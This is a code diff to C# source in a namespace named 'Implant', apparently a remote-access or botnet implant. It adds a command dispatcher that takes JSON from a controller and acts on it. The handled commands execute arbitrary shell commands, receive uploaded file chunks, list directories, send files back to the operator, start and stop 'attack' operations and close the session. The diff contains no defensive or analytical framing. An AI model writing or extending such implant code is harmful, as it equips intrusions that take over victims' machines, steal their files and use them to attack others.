@@ -50,7 +50,7 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant(string base_url, string group = "default", string sess_key="")
+        public Implant(string group = "default", string base_url = "", string sess_key="")
         {
             _base_url = base_url;
             _group = group;
@@ -118,6 +118,55 @@ namespace Implant
             {
             }
         }
+
+
+        
+        private async Task HandleCommand(string commandJson)
+        {
+            try
+            {
+                JObject data = JObject.Parse(commandJson);
+
+
+                if (data.ContainsKey("cmd"))
+                {
+                    await ExecuteCommand(data["cmd"].ToString());
+                }
+                else if (data.ContainsKey("chunk"))
+                {
+                    var chunkData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["chunk"].ToString());
+                    await HandleFileUpload(chunkData, data["destination"].ToString());
+                    
+                }
+                else if (data.ContainsKey("list_files"))
+                {
+                    var path = data.ContainsKey("path") ? data["path"].ToString() : _currentDir;
+                    await ListDirectory(path);
+                }
+                else if (data.ContainsKey("get_files"))
+                {
+                    await SendFile(data["get_files"].ToString());
+                }
+                else if (data.ContainsKey("attack"))
+                {
+                    var attackData = JsonConvert.DeserializeObject<Dictionary<string, object>>(data["attack"].ToString());
+                    await HandleAttackCommand(attackData);
+                }
+                else if (data.ContainsKey("stop_attack"))
+                {
+                    await StopAttack(data["stop_attack"].ToString());
+                }
+                else if (data.ContainsKey("finish"))
+                {
+                    await ExitWs();
+                }
+            }
+            catch (Exception e)
+            {
+                await SendResponse(new { error = e.Message });
+            }
+        }
+
 
 
         private async Task<string> ReceiveMessage()
